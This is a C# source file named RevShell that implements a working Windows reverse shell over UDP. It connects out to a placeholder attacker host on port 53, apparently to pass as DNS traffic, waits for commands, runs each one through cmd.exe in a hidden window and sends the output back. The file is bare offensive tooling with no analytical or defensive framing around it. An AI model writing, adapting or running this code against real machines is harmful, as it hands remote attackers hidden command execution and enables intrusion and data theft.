using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RevShell
{
    public class Program
    {
        public static void Main(string[] args)
        {
            UdpClient udpClient = new UdpClient(10001);

            try
            {
                udpClient.Connect("SRVIP", 53);
                string connectionMessage = $"Helle there\n";

                Byte[] sendBytes = Encoding.ASCII.GetBytes(connectionMessage);
                udpClient.Send(sendBytes, sendBytes.Length);

                IPEndPoint remoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

                while (true)
                {
                    Byte[] receiveBytes = udpClient.Receive(ref remoteIpEndPoint);
                    string returnData = Encoding.ASCII.GetString(receiveBytes);

                    Console.WriteLine("Received command from " + remoteIpEndPoint.Address.ToString());

                    string output = ExecuteCommand(returnData);

                    Byte[] outputBytes = Encoding.ASCII.GetBytes(output);
                    udpClient.Send(outputBytes, outputBytes.Length);
                }

                udpClient.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };

                Process process = Process.Start(processInfo);
                process.WaitForExit();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                if (string.IsNullOrEmpty(output) && !string.IsNullOrEmpty(error))
                {
                    return "Unknown command\n";
                }

                return output + error;
            }
            catch (Exception ex)
            {
                return "Unknown command\n";
            }
        }
    }
}
